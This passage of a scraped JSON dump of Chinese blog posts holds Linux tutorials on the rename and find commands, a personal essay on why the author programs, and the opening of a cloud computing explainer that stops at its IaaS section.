用一个命令。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls\r\nagenda.txt notes.txt weekly.txt\r\n$ rename 's/.txt//' *\r\n$ ls\r\nagenda notes weekly\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls,agenda,.,txt ,notes,.,txt ,weekly,.,txt,$, ,rename, ,'s/.txt//', ,*,$, ,ls,agenda ,notes ,weekly, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,现在让我们想象一下，你改变了心意，并希望把这些扩展名改回来。没问题。只需修改命令。窍门是理解第一个斜杠前的 ,s, 意味着“替代”。前两个斜线之间的内容是我们想要改变的东西，第二个斜线和第三个斜线之间是改变后的东西。所以，,$, 表示文件名的结尾，我们将它改为 ,.txt,。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls\r\nagenda notes weekly\r\n$ rename 's/$/.txt/' *\r\n$ ls\r\nagenda.txt notes.txt weekly.txt\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls,agenda ,notes ,weekly,$, ,rename, ,'s/$/.txt/', ,*,$, ,ls,agenda,.,txt ,notes,.,txt ,weekly,.,txt, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你也可以更改文件名的其他部分。牢记 ,s/旧内容/新内容/, 规则。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\n$ ls\r\ndraft-minutes-2018-03 draft-minutes-2018-04 draft-minutes-2018-05\r\n$ rename 's/draft/approved/' *minutes*\r\n$ ls\r\napproved-minutes-2018-03 approved-minutes-2018-04 approved-minutes-2018-05\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,3,4,5,6,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,$, ,ls,draft,-,minutes,-,2018,-,03, ,draft,-,minutes,-,2018,-,04, ,draft,-,minutes,-,2018,-,05,$, ,rename, ,'s/draft/approved/', ,*,minutes*,$, ,ls,approved,-,minutes,-,2018,-,03, ,approved,-,minutes,-,2018,-,04, ,approved,-,minutes,-,2018,-,05, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,在上面的例子中注意到，当我们在 ,s/old/new/, 中使用 ,s, 时，我们用另一个名称替换名称的一部分。当我们使用 ,y, 时，我们就是直译（将字符从一个范围替换为另一个范围）。,\n,总结,\n,现在有很多复制和重命名文件的方法。我希望其中的一些会让你在使用命令行时更愉快。,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 1 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114148/", "url_object_id": "4c1a5cd279328306ee9d94cacae94409", "front_image_path": "full/d1b17b98748a74826464a08e6d30a4ee1b15b171.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "title": "如何在 Linux 中使用 find", "create_time": "2018/05/17", "vote": "1", "bookmark": "3", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,Ben Cotton,   译文出处：,Linux中国/geekpi,   ,在,最近的一篇文章,中，Lewis Cowles 介绍了 ,find, 命令。,\n,find, 是日常工具箱中功能更强大、更灵活的命令行工具之一，因此值得花费更多的时间。,\n,最简单的，,find, 跟上路径寻找一些东西。例如：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind /\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,/, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,它将找到（并打印出）系统中的每个文件。而且由于一切都是文件，你会得到很多需要整理的输出。这可能不能帮助你找到你要找的东西。你可以改变路径参数来缩小范围，但它不会比使用 ,ls, 命令更有帮助。所以你需要考虑你想要找的东西。,\n,也许你想在主目录中找到所有的 JPEG 文件。 ,-name, 参数允许你将结果限制为与给定模式匹配的文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ -name '*jpg'\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,-,name, ,'*jpg', ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,可是等等！如果它们中的一些是大写的扩展名会怎么样？,-iname, 就像 ,-name,，但是不区分大小写。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ -iname '*jpg'\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,-,iname, ,'*jpg', ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,很好！但是 8.3 名称方案是如此的老。一些图片可能是 .jpeg 扩展名。幸运的是，我们可以将模式用“或”（表示为 ,-o,）来组合。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ ( -iname 'jpeg' -o -iname 'jpg' )\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,(, ,-,iname, ,'jpeg', ,-,o, ,-,iname, ,'jpg', ,), ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,我们正在接近目标。但是如果你有一些以 jpg 结尾的目录呢？ （为什么你要命名一个 ,bucketofjpg, 而不是 ,pictures, 的目录就超出了本文的范围。）我们使用 ,-type, 参数修改我们的命令来查找文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ ,\\( -iname '*jpeg' -o -iname '*jpg' \\), -type f\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,\\,(, ,-,iname, ,'*jpeg', ,-,o, ,-,iname, ,'*jpg', ,\\,), ,-,type, ,f, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者，也许你想找到那些命名奇怪的目录，以便稍后重命名它们：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ ,\\( -iname '*jpeg' -o -iname '*jpg' \\), -type d\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,\\,(, ,-,iname, ,'*jpeg', ,-,o, ,-,iname, ,'*jpg', ,\\,), ,-,type, ,d, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你最近拍了很多照片，所以让我们把它缩小到上周更改的文件。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ ,\\( -iname '*jpeg' -o -iname '*jpg' \\), -type f -mtime -7\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,\\,(, ,-,iname, ,'*jpeg', ,-,o, ,-,iname, ,'*jpg', ,\\,), ,-,type, ,f, ,-,mtime, ,-,7, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你可以根据文件状态更改时间 （,ctime,）、修改时间 （,mtime,） 或访问时间 （,atime,） 来执行时间过滤。 这些是在几天内，所以如果你想要更细粒度的控制，你可以表示为在几分钟内（分别是 ,cmin,、,mmin, 和 ,amin,）。 除非你确切地知道你想要的时间，否则你可能会在 ,+, （大于）或 ,-, （小于）的后面加上数字。,\n,但也许你不关心你的照片。也许你的磁盘空间不够用，所以你想在 ,log, 目录下找到所有巨大的（让我们定义为“大于 1GB”）文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind /var/log -size +1G\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,/,var,/,log, ,-,size, ,+,1G, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,或者，也许你想在 ,/data, 中找到 bcotton 拥有的所有文件：,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind /data -owner bcotton\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,/,data, ,-,owner ,bcotton, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,你还可以根据权限查找文件。也许你想在你的主目录中找到对所有人可读的文件，以确保你不会过度分享。,\r\n\r\n\t\t,\r\n\t\t\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\r\n\t\t\t,\nfind ~ -perm -o=r\r\n,\r\n\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t\t\t,1,2,\r\n\t\t\t\t,\r\n\t\t\t\t\t\t,find, ,~, ,-,perm, ,-,o,=,r, ,\r\n\t\t\t\t\t,\r\n\t\t\t\t,\r\n\t\t\t,\r\n\t\t,\r\n,\r\n,这篇文章只说了 ,find, 能做什么的表面。将测试条件与布尔逻辑相结合可以为你提供难以置信的灵活性，以便准确找到要查找的文件。并且像 ,-exec, 或 ,-delete, 这样的参数，你可以让 ,find, 对它发现的内容采取行动。你有任何最喜欢的 ,find, 表达式么？在评论中分享它们！,\n, ,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 3 收藏,\n\n                    ,  评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/114000/", "url_object_id": "50e131c5200d426df175c11073a3dcc7", "front_image_path": "full/14452eea6b79bce0219227f298ad827f2ba7112d.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2016/07/b82c41ce36630a47a22e10059671eb52.jpg"], "title": "我似乎理解了编程的意义", "create_time": "2018/05/21", "vote": "1", "bookmark": "2", "comments": "1", "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,技匠（微信公众号：techmask）,   ,编程的意义是什么，我又为什么要编程呢？这是一个不时会浮现在我脑海中的问题，它来得并不频繁，但每次却都伴随着对自己职业生涯或人生目标的质疑而产生，令我感到些许困惑和不安。而在这十几年的职业生涯中，我也似乎总能在每个阶段为自己找到一个继续热爱编程的理由，直到它已无法解答再一次疑惑的产生。就这样一次又一次的循环往复，我似乎渐渐理解了编程的意义……,\n,\n,编程是一项技能,\n,回想大学毕业刚成为一名程序员时，自己对技术是如此狂热，我不断地购买各类技术书籍，几乎所有的业余时间也都被用来钻研技术，提高自己的编程能力。我也因此很快成了同一批入职新人中，编码效率和质量最突出的一个。而在那段时间里所做的技术积累，也成了我日后工作的坚实基础，编程作为一项技能已经深深地嵌入到了我的身体里。,\n,即使到了今天，我仍非常怀念那段心无旁骛，一心钻研技术的日子。我为能在工作中写出的每一行优秀代码而兴奋，更为每一天能在技术上取得的点滴进步而喜悦，一切都是那么单纯，,编程的意义对于那时的我来说就在于技术本身,。,\n,编程是去解决问题,\n,“能力越大，责任也也大”，这句电影“蜘蛛侠”中的经典台词同样适用于程序员的职业生涯。随着技术能力的提升以及工作中获得的认可，我的职位也由原来的初级程序员变为了资深开发工程师，以及后来的架构师。相应的，除了编程之外，我工作中的很大一部分时间需要用来与用户进行沟通，并分析他们提出的需求。对于我来说这个角色转换的过程，是艰难甚至有些痛苦的。 我不得不用自己最薄弱的沟通技能去和用户打交道，更要命的是我所习惯使用的那些技术语言有时很难让他们理解。,\n,我很快意识到自己已不再是那个只需被动接受任务安排，并将自己的编程工作完成好就万事大吉的初级程序员。除了技术之外，我更需要能够突破程序员思维，去发现用户需求背后所隐含的真正问题。我比以前变得更加务实，不再刻意追求技术的高深，而是尽可能从问题本身出发，选择最有效的技术手段去解决它。,\n,此时，编程的意义也发生了改变，,它已不再局限于技术本身，而成了解决问题的理想工具,。,\n,编程是在表达，也是在创作,\n,就这样又过了几年，当“为什么要编程？”这个问题再次摆在我的面前时，自己也已过了而立之年。对于大多数中国程序员来说，这个年纪已经算是高龄，甚至还有很多人会认为 30 岁还在编程，一定是混得不够好吧。当然，对于这些质疑我也总是一笑了之。其实，在此之前我也有过很多转型的机会，比如去业务部门，或是转作管理等等，但最终我还是选择留在了技术岗位上，因为我觉得编程仍是我最喜欢的，或许也是我唯一擅长的吧。,\n,而这个时期也成了我整个程序员生涯的黄金期，我写了公司的核心框架以及一些重要业务系统的核心算法。我很享受这段时光，因为我已几乎感受不到那些技术上的牵绊，我更像雕刻师使用手中的刻刀一般，自如地运用编程来实现那些我认为优秀的东西。,\n,编程对于我来说已不再是一项技能或是工具，我是在,通过编程进行着自我表达与创作,，这种感受带给了我极大的自由度，而我也从中感受到了前所未有的喜悦与乐趣。,\n,编程是为了留下痕迹,\n,最终我还是走上了管理岗位，这里面有很多个人无法左右的因素（包括大环境、家庭、经济等等）。但我仍然更乐意被大家称为程序员或者“老”程序员。就像在简书的自我介绍中，我总是把全栈工程师放在那些“头衔”的第一位，我也还在利用业余时间做自己喜欢的开源或个人项目。当我再一次问自己“为什么要编程”时，获得了与以往不一样的感悟：,或许我们编程是为了能够留下一些痕迹吧,。,\n,公司里最近都在为一个老系统的升级问题发愁，这个系统已经运行了将近 20 年时间了，为了升级系统，大家不得不深入到这个系统的框架中，去读底层代码。我们读到了一位已经退休的美国同事Bill所实现的数据库连接池代码。在那个时候JAVA刚开始流行，还没有像 Spring 这样的框架，或是如 Hibernate 或 MyBatis 这样标准的持久层实现，这个系统中所有的数据库连接池及核心持久层代码都是由我的这位美国同事写的，这些代码让整个系统稳定运行了将近20年，大家都不禁为他高超的技术水平发出由衷的赞叹。,\n,我还认识一位从事证券交易软件研发的公司 CTO，看年纪应该已经接近 50 了，但他仍然在亲自写着那些证券交易的核心代码。当我问他到了这个年龄和职位，为什么还要坚持写代码时，他告诉我，当他看到自己所写的代码每天在支撑着千亿级的证券交易时，他感到非常兴奋和自豪，并不断地希望能够通过自己的努力将它做得更好。,\n,我的这个美国同事不会听到大家为他十几年前所代码发出的zan叹，股民们也不会知道这位 CTO 所写的代码正在支撑着他们的日常交易。,那些优秀的代码是他们留下的痕迹,，我们不能确定这些痕迹能够保留多久，或许几年，或许更短，但它们都曾经在我们的日常生活中产生了重要的价值，而新的未来也将构建在这些痕迹的基础之上，我想这可能才是编程的意义所在吧。,\n,我似乎理解了编程的意义，但我明白未来的某一天，我一定还会问自己同样的问题——为什么要编程，希望到那个时候自己还能是那个热爱编程，有着一颗匠心的“技匠”吧……,\n\r\n        \r\n        \r\n        \n    ,\n        , ,1, 赞,\n        , 2 收藏,\n\n                    , 1 评论,\n        \n        \n        \n        ,\n        ,\n            ,\n            ,\n            ,\n            ,\n            ,\n        ,\n\n    ,\n\n\n\n\r\n        ,\r\n\r\n\r\n,\r\n\t", "url": "http://blog.jobbole.com/112098/", "url_object_id": "559edfe4360defce6adda9e865d11934", "front_image_path": "full/8d41e17ba24bd494b959911d8123d0072c41e2a8.jpg"},{"front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/05/6a5fe11e3f98f0f2e1b80bb8e08373cf.png"], "title": "终于有人把云计算、大数据和人工智能讲明白了", "create_time": "2018/05/19", "vote": "4", "bookmark": "11", "comments": 0, "content": "\r\n\r\n        \t\t\t,\n\t\t\r\n\t\t,原文出处： ,刘超（popsuper1982）,   ,我今天要讲这三个话题，一个是云计算，一个大数据，一个人工智能，我为什么要讲这三个东西呢？因为这三个东西现在非常非常的火，它们之间好像互相有关系，一般谈云计算的时候也会提到大数据，谈人工智能的时候也会提大数据，谈人工智能的时候也会提云计算。所以说感觉他们又相辅相成不可分割，如果是非技术的人员来讲可能比较难理解说这三个之间的相互关系，所以有必要解释一下。,\n,一、云计算最初是实现资源管理的灵活性,\n,我们首先来说云计算，云计算最初的目标是对资源的管理，管理的主要是计算资源，网络资源，存储资源三个方面。,\n,\n,1.1 管数据中心就像配电脑,\n,什么叫计算，网络，存储资源呢？就说你要买台笔记本电脑吧，你是不是要关心这台电脑什么样的CPU啊？多大的内存啊？这两个我们称为计算资源。,\n,这台电脑要能上网吧，需要有个网口可以插网线，或者有无线网卡可以连接我们家的路由器，您家也需要到运营商比如联通，移动，电信开通一个网络，比如100M的带宽，然后会有师傅弄一根网线到您家来，师傅可能会帮您将您的路由器和他们公司的网络连接配置好，这样您家的所有的电脑，手机，平板就都可以通过您的路由器上网了。这就是网络。,\n,您可能还会问硬盘多大啊？原来硬盘都很小，10G之类的，后来500G，1T，2T的硬盘也不新鲜了。(1T是1000G)，这就是存储。,\n,对于一台电脑是这个样子的，对于一个数据中心也是同样的。想象你有一个非常非常大的机房，里面堆了很多的服务器，这些服务器也是有CPU，内存，硬盘的，也是通过类似路由器的设备上网的。这个时候的一个问题就是，运营数据中心的人是怎么把这些设备统一的管理起来的呢？,\n,1.2 灵活就是想啥时要都有，想要多少都行,\n,管理的目标就是要达到两个方面的灵活性。哪两个方面呢？比如有个人需要一台很小很小的电脑，只有一个CPU，1G内存，10G的硬盘，一兆的带宽，你能给他吗？像这种这么小规格的电脑，现在随便一个笔记本电脑都比这个配置强了，家里随便拉一个宽带都要100M。然而如果去一个云计算的平台上，他要想要这个资源的时候，只要一点就有了。,\n,所以说它就能达到两个方面灵活性。,\n,\n,第一个方面就是想什么时候要就什么时候要，比如需要的时候一点就出来了，这个叫做时间灵活性。,\n,第二个方面就是想要多少呢就有多少，比如需要一个很小很小的电脑，可以满足，比如需要一个特别大的空间，以云盘为例，似乎云盘给每个人分配的空间动不动就就很大很大，随时上传随时有空间，永远用不完，这个叫做空间灵活性。,\n,\n,空间灵活性和时间灵活性，也即我们常说的云计算的弹性。,\n,为了解决这个弹性的问题，经历了漫长时间的发展。,\n,1.3 物理设备不灵活,\n,首先第一个阶段就是物理机，或者说物理设备时期。这个时期相当于客户需要一台电脑，我们就买一台放在数据中心里。物理设备当然是越来越牛，例如服务器，内存动不动就是百G内存，例如网络设备，一个端口的带宽就能有几十G甚至上百G，例如存储，在数据中心至少是PB级别的(一个P是1000个T，一个T是1000个G)。,\n,然而物理设备不能做到很好的灵活性。首先它不能够达到想什么时候要就什么时候要、比如买台服务器，哪怕买个电脑，都有采购的时间。突然用户告诉某个云厂商，说想要开台电脑，如果使用物理服务器，当时去采购啊就很难，如果说供应商啊关系一般，可能采购一个月，供应商关系好的话也需要一个星期。用户等了一个星期后，这时候电脑才到位，用户还要登录上去开始慢慢部署自己的应用，时间灵活性非常差。第二是空间灵活性也不行，例如上述的用户，要一个很小很小的电脑，现在哪还有这么小型号的电脑啊。不能为了满足用户只要一个G的内存是80G硬盘的，就去买一个这么小的机器。但是如果买一个大的呢，因为电脑大，就向用户多收钱，用户说他只用这么小的一点，如果让用户多付钱就很冤。,\n,1.4 虚拟化灵活多了,\n,有人就想办法了。第一个办法就是虚拟化。用户不是只要一个很小的电脑么？数据中心的物理设备都很强大，我可以从物理的CPU，内存，硬盘中虚拟出一小块来给客户，同时也可以虚拟出一小块来给其他客户，每个客户都只能看到自己虚的那一小块，其实每个客户用的是整个大的设备上其中的一小块。虚拟化的技术能使得不同的客户的电脑看起来是隔离的，我看着好像这块盘就是我的，你看这呢这块盘就是你的，实际情况可能我这个10G和您这个10G是落在同样一个很大很大的这个存储上的。,\n,而且如果事先物理设备都准备好，虚拟化软件虚拟出一个电脑是非常快的，基本上几分钟就能解决。所以在任何一个云上要创建一台电脑，一点几分钟就出来了，就是这个道理。,\n,这个空间灵活性和时间灵活性就基本解决了。,\n,1.5 虚拟世界的赚钱与情怀,\n,在虚拟化阶段，最牛的公司是Vmware，是实现虚拟化技术比较早的一家公司，可以实现计算，网络，存储的虚拟化，这家公司很牛，性能也做得非常好，然后虚拟化软件卖的也非常好，赚了好多的钱，后来让EMC(世界五百强，存储厂商第一品牌)给收购了。,\n,但是这个世界上还是有很多有情怀的人的，尤其是程序员里面，有情怀的人喜欢做一件什么事情呢？开源。这个世界上很多软件都是有闭源就有开源，源就是源代码。就是说某个软件做的好，所有人都爱用，这个软件的代码呢，我封闭起来只有我公司知道，其他人不知道，如果其他人想用这个软件，就要付我钱，这就叫闭源。但是世界上总有一些大牛看不惯钱都让一家赚了去。大牛们觉得，这个技术你会我也会，你能开发出来，我也能，我开发出来就是不收钱，把代码拿出来分享给大家，全世界谁用都可以，所有的人都可以享受到好处，这个叫做开源。,\n,比如最近蒂姆·伯纳斯·李就是个非常有情怀的人，2017年，他因“发明万维网、第一个浏览器和使万维网得以扩展的基本协议和算法”而获得2016年度的图灵奖。图灵奖就是计算机界的诺贝尔奖。然而他最令人敬佩的是，他将万维网，也就是我们常见的www的技术无偿贡献给全世界免费使用。我们现在在网上的所有行为都应该感谢他的功劳，如果他将这个技术拿来收钱，应该和比尔盖茨差不多有钱。,\n,例如在闭源的世界里有windows，大家用windows都得给微软付钱，开源的世界里面就出现了Linux。比尔盖茨靠windows，Office这些闭源的软件赚了很多钱，称为世界首富，就有大牛开发了另外一种操作系统Linux。很多人可能没有听说过Linux，很多后台的服务器上跑的程序都是Linux上的，比如大家享受双十一，支撑双十一抢购的系统，无论是淘宝，京东，考拉，都是跑在Linux上的。,\n,再如有apple就有安卓。apple市值很高，但是苹果系统的代码我们是看不到的。于是就有大牛写了安卓手机操作系统。所以大家可以看到几乎所有的其他手机厂商，里面都装安卓系统，因为苹果系统不开源，而安卓系统大家都可以用。,\n,在虚拟化软件也一样，有了Vmware，这个软件非常非常的贵。那就有大牛写了两个开源的虚拟化软件，一个叫做Xen，一个叫做KVM，如果不做技术的，可以不用管这两个名字，但是后面还是会提到。,\n,1.6 虚拟化的半自动和云计算的全自动,\n,虚拟化软件似乎解决了灵活性问题，其实不全对。因为虚拟化软件一般创建一台虚拟的电脑，是需要人工指定这台虚拟电脑放在哪台物理机上的，可能还需要比较复杂的人工配置，所以使用Vmware的虚拟化软件，需要考一个很牛的证书，能拿到这个证书的人，薪资是相当的高，也可见复杂程度。所以仅仅凭虚拟化软件所能管理的物理机的集群规模都不是特别的大，一般在十几台，几十台，最多百台这么一个规模。这一方面会影响时间灵活性，虽然虚拟出一台电脑的时间很短，但是随着集群规模的扩大，人工配置的过程越来越复杂，越来越耗时。另一方面也影响空间灵活性，当用户数量多的时候，这点集群规模，还远达不到想要多少要多少的程度，很可能这点资源很快就用完了，还得去采购。所以随着集群的规模越来越大，基本都是千台起步，动辄上万台，甚至几十上百万台，如果去查一下BAT，包括网易，包括谷歌，亚马逊，服务器数目都大的吓人。这么多机器要靠人去选一个位置放这台虚拟化的电脑并做相应的配置，几乎是不可能的事情，还是需要机器去做这个事情。,\n,人们发明了各种各样的算法来做这个事情，算法的名字叫做调度(Scheduler)。通俗一点的说，就是有一个调度中心，几千台机器都在一个池子里面，无论用户需要多少CPU，内存，硬盘的虚拟电脑，调度中心会自动在大池子里面找一个能够满足用户需求的地方，把虚拟电脑启动起来做好配置，用户就直接能用了。这个阶段，我们称为池化，或者云化，到了这个阶段，才可以称为云计算，在这之前都只能叫虚拟化。,\n,1.7 云计算的私有与公有,\n,云计算大致分两种，一个是私有云，一个是公有云，还有人把私有云和公有云连接起来称为混合云，我们暂且不说这个。私有云就是把虚拟化和云化的这套软件部署在别人的数据中心里面，使用私有云的用户往往很有钱，自己买地建机房，自己买服务器，然后让云厂商部署在自己这里，Vmware后来除了虚拟化，也推出了云计算的产品，并且在私有云市场赚的盆满钵满。所谓公有云就是虚拟化和云化软件部署在云厂商自己数据中心里面的，用户不需要很大的投入，只要注册一个账号，就能在一个网页上点一下创建一台虚拟电脑，例如AWS也即亚马逊的公有云，例如国内的阿里云，腾讯云，网易云等。,\n,亚马逊呢为什么要做公有云呢？我们知道亚马逊原来是国外比较大的一个电商，它做电商的时候也肯定会遇到类似双11的场景，在某一个时刻大家都冲上来买东西。当大家都冲上买东西的时候，就特别需要云的时间灵活性和空间灵活性。因为它不能时刻准备好所有的资源，那样太浪费了。但也不能什么都不准备，看着双十一这么多用户想买东西登不上去。所以需要双十一的时候，创建一大批虚拟电脑来支撑电商应用，过了双十一再把这些资源都释放掉去干别的。所以亚马逊是需要一个云平台的。,\n,然而商用的虚拟化软件实在是太贵了，亚马逊总不能把自己在电商赚的钱全部给了虚拟化厂商吧。于是亚马逊基于开源的虚拟化技术，如上所述的Xen或者KVM，开发了一套自己的云化软件。没想到亚马逊后来电商越做越牛，云平台也越做越牛。而且由于他的云平台需要支撑自己的电商应用，而传统的云计算厂商多为IT厂商出身，几乎没有自己的应用，因而亚马逊的云平台对应用更加的友好，迅速发展成为云计算的第一品牌，赚了很多钱。在亚马逊公布其云计算平台财报之前，人们都猜测，亚马逊电商赚钱，云也赚钱吗？后来一公布财报，发现不是一般的赚钱，仅仅去年，亚马逊AWS年营收达122亿美元，运营利润31亿美元。,\n,1.8 云计算的赚钱与情怀,\n,公有云的第一名亚马逊过得很爽，第二名Rackspace过的就一般了。没办法，这就是互联网行业的残酷性，多是赢者通吃的模式。所以第二名如果不是云计算行业的，很多人可能都没听过了。第二名就想，我干不过老大怎么办呢？开源吧。如上所述，亚马逊虽然使用了开源的虚拟化技术，但是云化的代码是闭源的，很多想做又做不了云化平台的公司，只能眼巴巴的看着亚马逊挣大钱。Rackspace把源代码一公开，整个行业就可以一起把这个平台越做越好，兄弟们大家一起上，和老大拼了。,\n,于是Rackspace和美国航空航天局合作创办了开源软件OpenStack，如图所示OpenStack的架构图，不是云计算行业的不用弄懂这个图，但是能够看到三个关键字，Compute计算，Networking网络，Storage存储。还是一个计算，网络，存储的云化管理平台。,\n,当然第二名的技术也是非常棒的，有了OpenStack之后，果真像Rackspace想象的一样，所有想做云的大企业都疯了，你能想象到的所有如雷贯耳的大型IT企业，IBM，惠普，戴尔，华为，联想等等，都疯了。原来云平台大家都想做，看着亚马逊和Vmware赚了这么多钱，眼巴巴看着没办法，想自己做一个好像难度还挺大。现在好了，有了这样一个开源的云平台OpenStack，所有的IT厂商都加入到这个社区中来，对这个云平台进行贡献，包装成自己的产品，连同自己的硬件设备一起卖。有的做了私有云，有的做了公有云，OpenStack已经成为开源云平台的事实标准。,\n,1.9 IaaS, 